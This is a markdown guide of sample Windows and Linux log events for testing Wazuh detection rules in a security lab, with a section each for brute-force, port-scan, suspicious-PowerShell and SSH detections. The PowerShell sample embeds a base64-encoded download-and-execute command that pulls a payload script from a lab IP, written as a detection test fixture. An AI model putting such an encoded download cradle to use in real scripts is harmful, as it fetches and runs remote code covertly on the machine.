# SOC Lab Sample Test Logs

Use these sample events with `wazuh-logtest` or as reference when validating your detections.

## 1. Windows Brute Force

Rule IDs:

- `100100` base rule
- `100101` correlation rule

Example event:

```json
{
  "location": "EventChannel",
  "win": {
    "system": {
      "channel": "Security",
      "eventID": "4625",
      "computer": "WIN10-VICTIM"
    },
    "eventdata": {
      "targetUserName": "administrator",
      "ipAddress": "192.168.56.30",
      "logonType": "10",
      "status": "0xc000006d",
      "subStatus": "0xc000006a"
    }
  }
}
```

Expected result:

- one event matches `100100`
- five repeated events from the same source IP within `120` seconds trigger `100101`

## 2. Windows Port Scan

Rule IDs:

- `100110` base rule
- `100111` correlation rule

Example event:

```json
{
  "location": "EventChannel",
  "win": {
    "system": {
      "channel": "Security",
      "eventID": "5156",
      "computer": "WIN10-VICTIM"
    },
    "eventdata": {
      "sourceAddress": "192.168.56.30",
      "sourcePort": "49822",
      "destAddress": "192.168.56.20",
      "destPort": "445",
      "protocol": "6",
      "application": "System"
    }
  }
}
```

Expected result:

- one event matches `100110`
- ten events from the same source IP to different destination ports within `60` seconds trigger `100111`

## 3. Suspicious PowerShell

Rule ID:

- `100120`

Example event:

```json
{
  "location": "EventChannel",
  "win": {
    "system": {
      "channel": "Microsoft-Windows-Sysmon/Operational",
      "eventID": "1",
      "computer": "WIN10-VICTIM"
    },
    "eventdata": {
      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMwAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
      "parentImage": "C:\\Windows\\System32\\cmd.exe",
      "user": "WIN10-VICTIM\\labuser"
    }
  }
}
```

Expected result:

- the event triggers `100120`

## 4. Linux SSH Brute Force

Rule IDs:

- `100130` base rule
- `100131` correlation rule

Example auth log line:

```text
Apr 22 18:41:11 linux-victim sshd[1211]: Failed password for invalid user admin from 192.168.56.30 port 51121 ssh2
```

Expected result:

- one event matches `100130`
- five repeated failures from the same source IP within `120` seconds trigger `100131`
- if Active Response is enabled, `firewall-drop` should run on the Linux victim

## 5. Example `wazuh-logtest` Workflow

On the Wazuh server:

```bash
/var/ossec/bin/wazuh-logtest
```

Paste the sample event and verify:

- the relevant fields are decoded
- the correct base rule matches
- repeated submissions escalate the correlation rule
